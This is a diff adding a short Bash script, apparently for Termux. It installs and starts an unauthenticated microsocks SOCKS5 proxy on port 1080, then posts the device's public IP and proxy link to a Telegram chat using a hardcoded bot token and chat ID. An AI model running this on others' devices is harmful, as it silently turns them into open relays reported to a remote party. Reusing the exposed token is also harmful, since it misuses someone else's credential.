@@ -1,0 +1,16 @@
+#!/bin/bash
+
+# Configurações do Telegram
+BOT_TOKEN="7201057816:AAEzEsBi8_gT_w8fInqDCHa6hPUnAfNzMoQ"
+CHAT_ID="-1002527962526"
+
+# Instala e inicia o proxy
+pkg install -y microsocks curl
+pkill microsocks
+microsocks -p 1080 &
+
+# Envia mensagem para o Telegram
+curl -s "https://api.telegram.org/bot$BOT_TOKEN/sendMessage?chat_id=$CHAT_ID&text=🚀 Proxy SOCKS5 Ativo! 
+IP: \`$(curl -s ifconfig.me)\` 
+Porta: \`1080\` 
+Link: \`socks5://$(curl -s ifconfig.me):1080\`"
